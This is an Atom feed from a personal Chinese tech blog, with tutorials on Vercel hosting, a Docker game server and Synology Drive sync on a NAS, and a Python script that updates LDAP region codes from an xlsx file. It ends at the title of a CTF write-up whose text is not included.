<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Lufer</title>
  
  <subtitle>Code the World</subtitle>
  <link href="https://coder.lufer.cc/atom.xml" rel="self"/>
  
  <link href="https://coder.lufer.cc/"/>
  <updated>2021-12-17T03:59:35.254Z</updated>
  <id>https://coder.lufer.cc/</id>
  
  <author>
    <name>Lufer</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>使用Vercel为Github pages加速</title>
    <link href="https://coder.lufer.cc/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/%E4%BD%BF%E7%94%A8Vercel%E4%B8%BAGithub%20pages%E5%8A%A0%E9%80%9F/"/>
    <id>https://coder.lufer.cc/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/%E4%BD%BF%E7%94%A8Vercel%E4%B8%BAGithub%20pages%E5%8A%A0%E9%80%9F/</id>
    <published>2021-11-16T03:17:52.000Z</published>
    <updated>2021-12-17T03:59:35.254Z</updated>
    
    <content type="html"><![CDATA[<p>  最近感觉Github Pages访问越来越慢了，百度了一下发现了vercel这个东西，可以自动拉取github的更新并部署，测试了一下访问速度，只能算是矮子里面拔高个，有比没有强吧。</p><p><img src="https://pic.lufer.cc/images/2021/11/16/image11ad8021cdfe4bad.png" alt="网速对比" /></p><h1 id="创建项目"><a class="markdownIt-Anchor" href="#创建项目"></a> 创建项目</h1><p>  访问vercel的官网，<a href="https://vercel.com/">https://vercel.com/</a> ，注册账号并登陆。</p><p>  随后选择<code>Add Github Org or Account</code>,添加账户授权。</p><p><img src="https://pic.lufer.cc/images/2021/11/16/image650ed8763b5b8fcf.png" alt="添加账号" /></p><p>  这里我只给了博客仓库的权限。</p><p><img src="https://pic.lufer.cc/images/2021/11/16/image6b342f4861f8ac12.png" alt="仓库授权" /></p><p>  然后点击<code>import</code>就可以了。</p><p><img src="https://pic.lufer.cc/images/2021/11/16/image181137207cbe00d4.png" alt="导入仓库" /></p><p>  注意第一步，选择跳过创建团队，否则在14天的免费试用之后要收取$20的费用。</p><p><a href="https://pic.lufer.cc/image/d2ac"><img src="https://pic.lufer.cc/images/2021/11/16/image2271b8e17a914eb9.png" alt="不创建团队" /></a></p><p>  因为我只拉取静态页面，所以项目默认检测到Hexo是无法build出任何内容的,直接访问会404。<br />  <code>FRAMEWORK PRESET</code>改为<code>other</code>，然后把其他Build选项都override，这样就可以直接拉取静态页面并展示。</p><p><a href="https://pic.lufer.cc/image/dGK0"><img src="https://pic.lufer.cc/images/2021/11/16/imageb0f3c00186dc6aa3.md.png" alt="修改项目选项" /></a></p><p>  点击Deploy，就会自动生成项目。</p><h1 id="项目设置"><a class="markdownIt-Anchor" href="#项目设置"></a> 项目设置</h1><p>  创建好之后，还需要进行一些设置。</p><h2 id="分支设置"><a class="markdownIt-Anchor" href="#分支设置"></a> 分支设置</h2><p>  首先到<code>Settings</code>-<code>Git</code>里面，设置想要检测的分支，例如我的仓库源码分支的backup（默认分支），静态页面分支是master。所以import的时候会自动检测backup分支，我只希望拉取静态文件，故改成master分支。</p><p><a href="https://pic.lufer.cc/image/dLho"><img src="https://pic.lufer.cc/images/2021/11/16/image8e3dce0bd14b310b.md.png" alt="分支设置" /></a></p><h2 id="域名设置"><a class="markdownIt-Anchor" href="#域名设置"></a> 域名设置</h2><p>  在<code>Settings</code>-<code>Domains</code>里面，输入我们自己的域名，并点击Add。</p><p>  并根据提示，到域名的DNS管理页面将域名通过CNAME解析到<code>cname.vercel-dns.com</code>。</p><p>  点击Refresh，就可以看到解析已经成功。</p><p><img src="https://pic.lufer.cc/images/2021/11/16/image90b7a33d5846b563.png" alt="域名解析" /></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  最近感觉Github Pages访问越来越慢了，百度了一下发现了vercel这个东西，可以自动拉取github的更新并部署，测试了一下访问速度，只能算是矮子里面拔高个，有比没有强吧。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://pic.lufer.cc/image</summary>
      
    
    
    
    <category term="日常折腾" scheme="https://coder.lufer.cc/categories/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/"/>
    
    
    <category term="日常折腾" scheme="https://coder.lufer.cc/tags/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/"/>
    
    <category term="Blog" scheme="https://coder.lufer.cc/tags/Blog/"/>
    
  </entry>
  
  <entry>
    <title>在群晖中用Docker创建7日杀服务器</title>
    <link href="https://coder.lufer.cc/NAS/%E5%9C%A8%E7%BE%A4%E6%99%96%E4%B8%AD%E7%94%A8Docker%E5%88%9B%E5%BB%BA7%E6%97%A5%E6%9D%80%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>https://coder.lufer.cc/NAS/%E5%9C%A8%E7%BE%A4%E6%99%96%E4%B8%AD%E7%94%A8Docker%E5%88%9B%E5%BB%BA7%E6%97%A5%E6%9D%80%E6%9C%8D%E5%8A%A1%E5%99%A8/</id>
    <published>2021-11-16T02:41:28.000Z</published>
    <updated>2021-12-17T03:59:35.254Z</updated>
    
    <content type="html"><![CDATA[<h1 id="选择映像"><a class="markdownIt-Anchor" href="#选择映像"></a> 选择映像</h1><p>  在docker的注册表中搜索7dtd，下载didstopia的这个映像即可。</p><p><a href="https://pic.lufer.cc/image/dliT"><img src="https://pic.lufer.cc/images/2021/11/16/image8d24a9227f248b50.md.png" alt="docker市场" /></a></p><p>  此映像的官方文档如下：</p><p>  <a href="https://registry.hub.docker.com/r/didstopia/7dtd-server/">https://registry.hub.docker.com/r/didstopia/7dtd-server/</a></p><h1 id="配置容器"><a class="markdownIt-Anchor" href="#配置容器"></a> 配置容器</h1><h2 id="资源限制"><a class="markdownIt-Anchor" href="#资源限制"></a> 资源限制</h2><p>  这个映像大小是1GB，下载完成之后启动。<br />  给映像分配不低于4096MB的内存，不然资源可能不够用。</p><p><a href="https://pic.lufer.cc/image/dE25"><img src="https://pic.lufer.cc/images/2021/11/04/image.md.png" alt="资源限制" /></a></p><h2 id="文件夹映射"><a class="markdownIt-Anchor" href="#文件夹映射"></a> 文件夹映射</h2><p>  在系统中创建两个文件夹，分别用于存放steamcmd与7dtd delicated server以及服务器配置文件。</p><p>  我这里创建了data文件夹用于存放steam及服务器程序，config文件夹用于存放服务器配置文件及存档。</p><p><img src="https://pic.lufer.cc/images/2021/11/16/imagef396358ddc36f5ad.png" alt="准备文件夹" /></p><p>  准备好两个文件夹之后在docker中创建映射。<br />  分别映射到<code>/app/.local/share/7DaysToDie</code>和<code>/steamcmd/7dtd</code></p><p><a href="https://pic.lufer.cc/image/dQdv"><img src="https://pic.lufer.cc/images/2021/11/04/image491f728efd1445cd.png" alt="文件映射" /></a></p><h2 id="端口映射"><a class="markdownIt-Anchor" href="#端口映射"></a> 端口映射</h2><p>  七日杀服务器默认使用的端口是26900~26902，然后8080和8081分别用来启用管理员网页后台以及telnet端口，按图中设置即可。</p><p><a href="https://pic.lufer.cc/image/dZMy"><img src="https://pic.lufer.cc/images/2021/11/04/imageeea269dd233508b5.png" alt="端口映射" /></a></p><h1 id="服务器配置"><a class="markdownIt-Anchor" href="#服务器配置"></a> 服务器配置</h1><h2 id="修改docker启动方式"><a class="markdownIt-Anchor" href="#修改docker启动方式"></a> 修改docker启动方式</h2><p>  首先启动一次docker，会自动下载最新的steamcmd和七日杀服务器程序。<br />  但是每次docker启动时都会自动下载，所以在下载成功一次之后我们可以改一次docker配置，在docker的环境变量里面把<code>SEVEN_DAYS_TO_DIE_START_MODE</code>改为2，默认为0。0代表每次都自动下载最新版，1代表只更新，2代表跳过更新直接启动。</p><p><img src="https://pic.lufer.cc/images/2021/11/16/image4e7387ef23d139a6.png" alt="修改启动模式" /></p><h2 id="修改服务器配置"><a class="markdownIt-Anchor" href="#修改服务器配置"></a> 修改服务器配置</h2><p>  找到我们之前创建的config文件夹，下载其中的serverconfig.xml，可以修改服务器密码，服务器所使用的存档以及一些游戏性设置，具体可见官方说明。</p><p>  如果有先前的存档，可以上传至config\Saves\对应的文件夹下，然后修改serverconfig.xml把word改成对应的存档文件夹名称即可。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;选择映像&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#选择映像&quot;&gt;&lt;/a&gt; 选择映像&lt;/h1&gt;
&lt;p&gt;  在docker的注册表中搜索7dtd，下载didstopia的这个映像即可。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://p</summary>
      
    
    
    
    <category term="日常折腾" scheme="https://coder.lufer.cc/categories/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/"/>
    
    
    <category term="日常折腾" scheme="https://coder.lufer.cc/tags/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/"/>
    
    <category term="NAS" scheme="https://coder.lufer.cc/tags/NAS/"/>
    
  </entry>
  
  <entry>
    <title>使用群辉的Drive套件实现同步盘</title>
    <link href="https://coder.lufer.cc/NAS/%E4%BD%BF%E7%94%A8%E7%BE%A4%E8%BE%89%E7%9A%84Drive%E5%A5%97%E4%BB%B6%E5%AE%9E%E7%8E%B0%E5%90%8C%E6%AD%A5%E7%9B%98/"/>
    <id>https://coder.lufer.cc/NAS/%E4%BD%BF%E7%94%A8%E7%BE%A4%E8%BE%89%E7%9A%84Drive%E5%A5%97%E4%BB%B6%E5%AE%9E%E7%8E%B0%E5%90%8C%E6%AD%A5%E7%9B%98/</id>
    <published>2021-10-10T03:56:58.000Z</published>
    <updated>2021-12-17T03:59:35.254Z</updated>
    
    <content type="html"><![CDATA[<p>  之前一直使用OneDrive作为同步盘，用来在公司电脑、个人电脑以及pad上同步文件。</p><p>  由于使用edu邮箱可以有有1T的空间，所以一直在用学校的邮箱作为账号，但是国庆过完之后发现怎么也无法登陆onedrive了，搜了一下居然是学校被制裁了。</p><p>  由于我大部分工作是在公司电脑上完成的，所以公司的onedrive文件夹下基本上保有了所有的文件，连忙将文件转移出来，基本没有损失。</p><p>  OneDrive不能用了，开始研究用自己的NAS作为同步盘，借助群辉的Drive套件。</p><p>  Drive的官方网址：<a href="https://www.synology.cn/zh-cn/dsm/feature/drive">https://www.synology.cn/zh-cn/dsm/feature/drive</a></p><h1 id="安装drive"><a class="markdownIt-Anchor" href="#安装drive"></a> 安装Drive</h1><p>  在套件中心找到<code>Drive</code>，安装套件。</p><p>  装的时候我这边一直提示“安装套件出错”，并且装完之后在菜单里面看不见，但是看日志是已经装好的。</p><p>  重启了一下NAS，菜单里面就出现了Drive。</p><p><img src="https://pic.lufer.cc/images/2021/10/10/image.png" alt="装好Drive的菜单" /></p><p>  菜单里面会有两个新项目，<code>Drive管理控制台</code>和<code>Drive</code>。</p><p>  其中我们主要使用的是<code>Drive管理控制台</code>，而<code>Drive</code>是一个网页版的文件查看器，并无大用。</p><h1 id="配置drive"><a class="markdownIt-Anchor" href="#配置drive"></a> 配置Drive</h1><p>  首先新建一个文件夹，用于同步文件。</p><p>  <code>控制面板</code>-<code>共享文件夹</code>，创建一个新的文件夹，我这里叫CloudSync。</p><p>  打开<code>Drive管理控制台</code>，进入<code>团队文件夹</code>选项，把刚创建的文件夹启用。</p><p><img src="https://pic.lufer.cc/images/2021/10/10/image345edfc2f4605009.png" alt="启用文件夹" /></p><p>  启用的时候会有一个对话框，全部默认点确定就行。</p><p>  启用之后服务端的设置就已经完成了。</p><h1 id="frp内网穿透"><a class="markdownIt-Anchor" href="#frp内网穿透"></a> FRP内网穿透</h1><p>这里要注意，针对PC客户端和手机客户端，使用的端口是不一样的，我一开始仅穿透6690端口，PC端使用毫无问题，但是手机客户端无法连接，还需穿透5000和5001端口。<br />  修改Docker里面的frpc.ini，添加一条穿透记录，采用tcp的方式穿透6690，5000,5001端口</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[lufer_Drive]</span></span><br><span class="line"><span class="attr">type</span>=tcp</span><br><span class="line"><span class="attr">local_ip</span>=<span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span>=<span class="number">6690</span></span><br><span class="line"><span class="attr">remote_port</span>=<span class="number">6690</span></span><br><span class="line"><span class="attr">custom_domains</span>=设置的域名</span><br><span class="line"></span><br><span class="line"><span class="section">[lufer_DriveforHTTP]</span></span><br><span class="line"><span class="attr">type</span>=tcp</span><br><span class="line"><span class="attr">local_ip</span>=<span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span>=<span class="number">5000</span></span><br><span class="line"><span class="attr">remote_port</span>=<span class="number">5000</span></span><br><span class="line"><span class="attr">custom_domains</span>=设置的域名</span><br><span class="line"></span><br><span class="line"><span class="section">[lufer_DriveforHTTPS]</span></span><br><span class="line"><span class="attr">type</span>=tcp</span><br><span class="line"><span class="attr">local_ip</span>=<span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span>=<span class="number">5001</span></span><br><span class="line"><span class="attr">remote_port</span>=<span class="number">5001</span></span><br><span class="line"><span class="attr">custom_domains</span>=设置的域名</span><br></pre></td></tr></table></figure><p>  随后在域名的DNS解析记录中添加上要用来解析的域名，把frpc.ini传回Docker文件夹，重启FRP服务。</p><h1 id="客户端配置"><a class="markdownIt-Anchor" href="#客户端配置"></a> 客户端配置</h1><p>  下载Drive的Windows客户端，官网说还支持macOS，Linux，以及Android和IOS，可以说生态非常全面了。</p><p>  <a href="http://cndl.synology.cn/download/Utility/SynologyDriveClient/1.1.4-10580/Windows/Installer/Synology%20Drive-1.1.4-10580.exe?SynoToken=HSoLkkUiP9JSk">http://cndl.synology.cn/download/Utility/SynologyDriveClient/1.1.4-10580/Windows/Installer/Synology Drive-1.1.4-10580.exe?SynoToken=HSoLkkUiP9JSk</a></p><p>  下载完成之后安装，输入域名及登录群辉的用户名和密码，选择文件夹。</p><p>  这里借用了别人的图，因为我已经设置过了，先点铅笔，选择Drive中的文件夹，再配置本地文件夹，然后下一步即可。</p><p><img src="https://pic.lufer.cc/images/2021/10/10/imagedb2ac653df8692ee.png" alt="文件夹设置" /></p><p>  下一步有一个共享盘，这个没什么用，跳过就行，然后就完成了配置。</p><h1 id="使用效果"><a class="markdownIt-Anchor" href="#使用效果"></a> 使用效果</h1><p>  完成之后在你配置的本地文件夹内，如果你规则选择的是双向同步（默认），那么文件夹内所有的更改都会同步到NAS上，和OneDrive的使用效果相同。</p><p>  实际用起来速度还是很快的。</p><p><img src="https://pic.lufer.cc/images/2021/10/10/16338399341.png" alt="任务同步" /></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  之前一直使用OneDrive作为同步盘，用来在公司电脑、个人电脑以及pad上同步文件。&lt;/p&gt;
&lt;p&gt;  由于使用edu邮箱可以有有1T的空间，所以一直在用学校的邮箱作为账号，但是国庆过完之后发现怎么也无法登陆onedrive了，搜了一下居然是学校被制裁了。&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="日常折腾" scheme="https://coder.lufer.cc/categories/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/"/>
    
    
    <category term="日常折腾" scheme="https://coder.lufer.cc/tags/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/"/>
    
    <category term="NAS" scheme="https://coder.lufer.cc/tags/NAS/"/>
    
  </entry>
  
  <entry>
    <title>使用Python读取xlsx文件内容并操作LDAP</title>
    <link href="https://coder.lufer.cc/Python/%E4%BD%BF%E7%94%A8Python%E8%AF%BB%E5%8F%96xlsx%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E5%B9%B6%E6%93%8D%E4%BD%9CLDAP/"/>
    <id>https://coder.lufer.cc/Python/%E4%BD%BF%E7%94%A8Python%E8%AF%BB%E5%8F%96xlsx%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E5%B9%B6%E6%93%8D%E4%BD%9CLDAP/</id>
    <published>2021-09-18T04:32:10.000Z</published>
    <updated>2021-12-17T03:59:35.252Z</updated>
    
    <content type="html"><![CDATA[<p>  最近手上一个项目要用LDAP中的行政区划代码做校验，但是目前搭建的LDAP中行政区划代码太老。<br />  同事从网上扒了2020年国家统计局的行政区划代码，以xlsx文件形式存储，要读取其中内容并更新LDAP中的区划名称，不存在的要新增。</p><h1 id="启用简单身份验证"><a class="markdownIt-Anchor" href="#启用简单身份验证"></a> 启用简单身份验证</h1><p>  目前的LDAP用的是Kerberos验证，测试了python-ldap和ldap3两个库，都没弄明白怎么实现这种验证方式，最后还是用了简单身份验证。</p><p>  先找个目录创建一个用户。</p><p>  <code>新建-对象</code>，类选择<code>user</code>，填写用户名，我这里创建了一个<code>testuser</code>。</p><p><img src="https://pic.lufer.cc/images/2021/09/24/image.png" alt="新建用户" /></p><p>  然后在创建好的用户上<code>右键-重置密码</code>，设置一个密码。</p><p>  默认的账户是禁用的，要先启用。<code>右键-属性</code>，找到<code>MsDS-UserAccountDisabled</code>，设置为<code>未设置</code>或<code>禁用</code>。</p><p>  然后将账户添加到管理员中，找到<code>CN=Roles</code>,修改<code>CN=Administrators</code>的属性，找到<code>member</code>。</p><p>  选择<code>添加DN</code>，把刚刚创建的用户DN（distinguishedName）添加进去，例如<code>CN=testuser,DC=tobaccoid,DC=com</code></p><p><img src="https://pic.lufer.cc/images/2021/09/24/imageb87c894861b52aaf.png" alt="添加到管理员列表" /></p><p>  至此就可以用这个用户名和密码进行简单身份验证登录了。</p><h1 id="安装xlrd"><a class="markdownIt-Anchor" href="#安装xlrd"></a> 安装xlrd</h1><p>  要读取excel文件，需要用到xlrd这个库，但是要注意在1.2.0版本之后就不支持xlsx文件了，因此要安装指定版本<br /><code>pip install xlrd==1.2.0</code></p><p>  装好之后就可以进行读取，基本用法如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xlrd</span><br><span class="line"><span class="comment"># 读取文件</span></span><br><span class="line">wb = xlrd.open_workbook(<span class="string">&#x27;data.xlsx&#x27;</span>)</span><br><span class="line"><span class="comment"># 获取工作表</span></span><br><span class="line">table = data.sheets()[<span class="number">0</span>]          <span class="comment">#通过索引顺序获取</span></span><br><span class="line">table = data.sheet_by_index(sheet_indx)) <span class="comment">#通过索引顺序获取</span></span><br><span class="line">table = data.sheet_by_name(sheet_name)<span class="comment">#通过名称获取</span></span><br><span class="line"><span class="comment"># 获取数据范围</span></span><br><span class="line">nrows = table.nrows   <span class="comment">#获取有效行数</span></span><br><span class="line">ncols = table.ncols   <span class="comment">#获取有效列数</span></span><br><span class="line"><span class="comment"># 行操作</span></span><br><span class="line">table.row(rowx)  <span class="comment">#返回由该行中所有的单元格对象组成的列表</span></span><br><span class="line">table.row_slice(rowx)  <span class="comment">#返回由该列中所有的单元格对象组成的列表</span></span><br><span class="line">table.row_types(rowx, start_colx=<span class="number">0</span>, end_colx=<span class="literal">None</span>)    <span class="comment">#返回由该行中所有单元格的数据类型组成的列表</span></span><br><span class="line">table.row_values(rowx, start_colx=<span class="number">0</span>, end_colx=<span class="literal">None</span>)   <span class="comment">#返回由该行中所有单元格的数据组成的列表</span></span><br><span class="line">table.row_len(rowx) <span class="comment">#返回该列的有效单元格长度</span></span><br><span class="line"><span class="comment"># 列操作</span></span><br><span class="line">table.col(colx, start_rowx=<span class="number">0</span>, end_rowx=<span class="literal">None</span>)  <span class="comment">#返回由该列中所有的单元格对象组成的列表</span></span><br><span class="line">table.col_slice(colx, start_rowx=<span class="number">0</span>, end_rowx=<span class="literal">None</span>)  <span class="comment">#返回由该列中所有的单元格对象组成的列表</span></span><br><span class="line">table.col_types(colx, start_rowx=<span class="number">0</span>, end_rowx=<span class="literal">None</span>)    <span class="comment">#返回由该列中所有单元格的数据类型组成的列表</span></span><br><span class="line">table.col_values(colx, start_rowx=<span class="number">0</span>, end_rowx=<span class="literal">None</span>)   <span class="comment">#返回由该列中所有单元格的数据组成的列表</span></span><br><span class="line"><span class="comment"># 单元格操作</span></span><br><span class="line"><span class="built_in">id</span> = table.cell(row,col).value  <span class="comment">#获取row行col列的单元格的值</span></span><br></pre></td></tr></table></figure><h1 id="安装ldap3"><a class="markdownIt-Anchor" href="#安装ldap3"></a> 安装ldap3</h1><p>  python-ladp这个库有点老了，最后用了ldap3这个库进行操作:<code>pip install ldap3</code>。<br />  官方文档：<a href="https://ldap3.readthedocs.io/">https://ldap3.readthedocs.io/</a></p><p>  装好之后基本操作如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ldap3 <span class="keyword">import</span> Server, Connection, ALL, SUBTREE, MODIFY_REPLACE</span><br><span class="line"><span class="comment"># 连接服务器</span></span><br><span class="line">s = Server(<span class="string">&#x27;serveraddress&#x27;</span>, get_info=ALL)  </span><br><span class="line"><span class="comment"># 指定使用的用户</span></span><br><span class="line">c = Connection(s, user=<span class="string">&#x27;CN=testuser,DC=tobaccoid,DC=com&#x27;</span>, password=<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line"><span class="comment"># 建立连接</span></span><br><span class="line">c.bind()</span><br><span class="line"><span class="comment"># 检索操作</span></span><br><span class="line"><span class="comment">## search_base：要检索的根目录</span></span><br><span class="line"><span class="comment">## search_filter：过滤器，设定检索条件，例如这里是指定属性cn为特定值，且类型为locality。</span></span><br><span class="line"><span class="comment">## attributes：需要返回的属性，例如这里返回的内容中就带有属性cn和l</span></span><br><span class="line"><span class="built_in">filter</span> = <span class="string">&#x27;(&amp;(cn=&#x27;</span> + oldcode + <span class="string">&#x27;)(objectClass=locality))&#x27;</span></span><br><span class="line">c.search(search_base=<span class="string">&#x27;C=CN,DC=tobaccoid,DC=com&#x27;</span>, search_filter=<span class="built_in">filter</span>, search_scope=SUBTREE, attributes=[<span class="string">&#x27;cn&#x27;</span>, <span class="string">&#x27;l&#x27;</span>])</span><br><span class="line"><span class="comment"># 返回值在c.entries中，是一个列表，列表中的数据是json字符串，先转为对象</span></span><br><span class="line">tempentry=c.entries[<span class="number">0</span>].entry_to_json()</span><br><span class="line">entry=json.loads(tempentry)</span><br><span class="line"><span class="comment"># 更新属性</span></span><br><span class="line"><span class="comment">## 更新属性需要用dn作为主键，因此需要得到dn，再更改属性，此处更改了cn这个属性的值为newcode</span></span><br><span class="line">olddn = entry[<span class="string">&#x27;dn&#x27;</span>]</span><br><span class="line">c.modify(olddn,&#123;<span class="string">&#x27;cn&#x27;</span>: [(MODIFY_REPLACE, [newcode])]&#125;)</span><br><span class="line"><span class="comment"># 更新DN</span></span><br><span class="line"><span class="comment">## 如果要更改DN，需要运动modify_dn这个值，且此操作不能更新其他属性。</span></span><br><span class="line">c.modify_dn(olddn, <span class="string">&#x27;L=&#x27;</span>+name)</span><br><span class="line"><span class="comment"># 新增操作</span></span><br><span class="line"><span class="comment">## add操作可以同时创建新的DN，并赋予其属性值，这里将新增的条目objectclass设置为locality，属性cn设置为newcode。</span></span><br><span class="line">c.add(newdn,[<span class="string">&#x27;locality&#x27;</span>],&#123;<span class="string">&#x27;cn&#x27;</span>:newcode&#125;)</span><br></pre></td></tr></table></figure><h1 id="完整代码"><a class="markdownIt-Anchor" href="#完整代码"></a> 完整代码</h1><p>  因为我这里的xlsx文件和实际情况有些区别，因此先做了一次数据处理。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ldap3 <span class="keyword">import</span> Server, Connection, ALL, SUBTREE, MODIFY_REPLACE</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> xlrd</span><br><span class="line"><span class="comment"># 处理工作表</span></span><br><span class="line">wb = xlrd.open_workbook(<span class="string">&#x27;data.xlsx&#x27;</span>)</span><br><span class="line"><span class="comment"># 按工作簿定位工作表</span></span><br><span class="line">sh = wb.sheet_by_name(<span class="string">&#x27;tab_citys&#x27;</span>)</span><br><span class="line">total = sh.nrows</span><br><span class="line">result = []</span><br><span class="line">head = <span class="string">&quot;C=CN,DC=tobaccoid,DC=com&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, total):</span><br><span class="line">    <span class="built_in">id</span> = sh.cell(i, <span class="number">0</span>).value  <span class="comment"># id</span></span><br><span class="line">    parid = sh.cell(i, <span class="number">1</span>).value  <span class="comment"># parent_id</span></span><br><span class="line">    name = sh.cell(i, <span class="number">2</span>).value  <span class="comment"># city_name</span></span><br><span class="line">    oldcode = sh.cell(i, <span class="number">5</span>).value  <span class="comment"># city_code</span></span><br><span class="line">    newcode = sh.cell(i, <span class="number">6</span>).value  <span class="comment"># code</span></span><br><span class="line">    temp = &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span> parid == <span class="number">0</span>:</span><br><span class="line">        temp[<span class="string">&#x27;id&#x27;</span>] = <span class="built_in">id</span></span><br><span class="line">        temp[<span class="string">&#x27;dn&#x27;</span>] = <span class="string">&quot;L=&quot;</span> + name + <span class="string">&quot;,&quot;</span> + head</span><br><span class="line">        temp[<span class="string">&#x27;name&#x27;</span>] = name</span><br><span class="line">        temp[<span class="string">&#x27;oldcode&#x27;</span>] = oldcode</span><br><span class="line">        temp[<span class="string">&#x27;newcode&#x27;</span>] = newcode</span><br><span class="line">        result.append(temp)</span><br><span class="line">        print(temp)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> city <span class="keyword">in</span> result:</span><br><span class="line">            <span class="keyword">if</span> city[<span class="string">&#x27;id&#x27;</span>] == parid:</span><br><span class="line">                temp[<span class="string">&#x27;id&#x27;</span>] = <span class="built_in">id</span></span><br><span class="line">                temp[<span class="string">&#x27;dn&#x27;</span>] = <span class="string">&quot;L=&quot;</span> + name + <span class="string">&quot;,&quot;</span> + city[<span class="string">&#x27;dn&#x27;</span>]</span><br><span class="line">                temp[<span class="string">&#x27;name&#x27;</span>] = name</span><br><span class="line">                temp[<span class="string">&#x27;oldcode&#x27;</span>] = oldcode</span><br><span class="line">                temp[<span class="string">&#x27;newcode&#x27;</span>] = newcode</span><br><span class="line">                result.append(temp)</span><br><span class="line">                print(temp)</span><br><span class="line"><span class="comment"># 连接服务器</span></span><br><span class="line">s = Server(<span class="string">&#x27;serveraddress&#x27;</span>, get_info=ALL)  <span class="comment"># define an unsecure LDAP server, requesting info on DSE and schema</span></span><br><span class="line"><span class="comment"># define the connection</span></span><br><span class="line">c = Connection(s, user=<span class="string">&#x27;CN=username,DC=tobaccoid,DC=com&#x27;</span>, password=<span class="string">&#x27;password#&#x27;</span>)</span><br><span class="line">c.bind()</span><br><span class="line"><span class="comment"># 遍历更新</span></span><br><span class="line"><span class="keyword">for</span> city <span class="keyword">in</span> result:</span><br><span class="line">    oldcode = city[<span class="string">&#x27;oldcode&#x27;</span>]</span><br><span class="line">    newcode = city[<span class="string">&#x27;newcode&#x27;</span>]</span><br><span class="line">    newdn=city[<span class="string">&#x27;dn&#x27;</span>]</span><br><span class="line">    <span class="built_in">filter</span> = <span class="string">&#x27;(&amp;(cn=&#x27;</span> + oldcode + <span class="string">&#x27;)(objectClass=locality))&#x27;</span></span><br><span class="line">    c.search(search_base=<span class="string">&#x27;C=CN,DC=tobaccoid,DC=com&#x27;</span>, search_filter=<span class="built_in">filter</span>, search_scope=SUBTREE, attributes=[<span class="string">&#x27;cn&#x27;</span>, <span class="string">&#x27;l&#x27;</span>])</span><br><span class="line">    res = <span class="built_in">len</span>(c.response)</span><br><span class="line">    <span class="keyword">if</span> res &gt; <span class="number">0</span>:</span><br><span class="line">        tempentry=c.entries[<span class="number">0</span>].entry_to_json()</span><br><span class="line">        entry=json.loads(tempentry)</span><br><span class="line">        print(entry)</span><br><span class="line">        olddn = entry[<span class="string">&#x27;dn&#x27;</span>]</span><br><span class="line">        name = city[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">        <span class="comment">#修改code</span></span><br><span class="line">        c.modify(olddn,&#123;<span class="string">&#x27;cn&#x27;</span>: [(MODIFY_REPLACE, [newcode])]&#125;)</span><br><span class="line">        <span class="keyword">if</span>(olddn!=newdn):</span><br><span class="line">            <span class="comment">#修改name</span></span><br><span class="line">            c.modify_dn(olddn, <span class="string">&#x27;L=&#x27;</span>+name)</span><br><span class="line">            print(<span class="string">&quot;update:&quot;</span>+olddn)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        c.add(newdn,[<span class="string">&#x27;locality&#x27;</span>],&#123;<span class="string">&#x27;cn&#x27;</span>:newcode&#125;)</span><br><span class="line">        print(<span class="string">&quot;add:&quot;</span> + newdn)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  最近手上一个项目要用LDAP中的行政区划代码做校验，但是目前搭建的LDAP中行政区划代码太老。&lt;br /&gt;
  同事从网上扒了2020年国家统计局的行政区划代码，以xlsx文件形式存储，要读取其中内容并更新LDAP中的区划名称，不存在的要新增。&lt;/p&gt;
&lt;h1 id=&quot;</summary>
      
    
    
    
    <category term="Python" scheme="https://coder.lufer.cc/categories/Python/"/>
    
    
    <category term="Python" scheme="https://coder.lufer.cc/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>CFT选拔赛题解</title>
    <link href="https://coder.lufer.cc/CTF/CFT%E9%80%89%E6%8B%94%E8%B5%9B%E9%A2%98%E8%A7%A3/"/>
    <id>https://coder.lufer.cc/CTF/CFT%E9%80%89%E6%8B%94%E8%B5%9B%E9%A2%98%E8%A7%A3/</id>
    <published>2021-08-13T07:46:20.000Z</published>
    <updated>2021-12-17T03:59:35.914Z</updated>
    
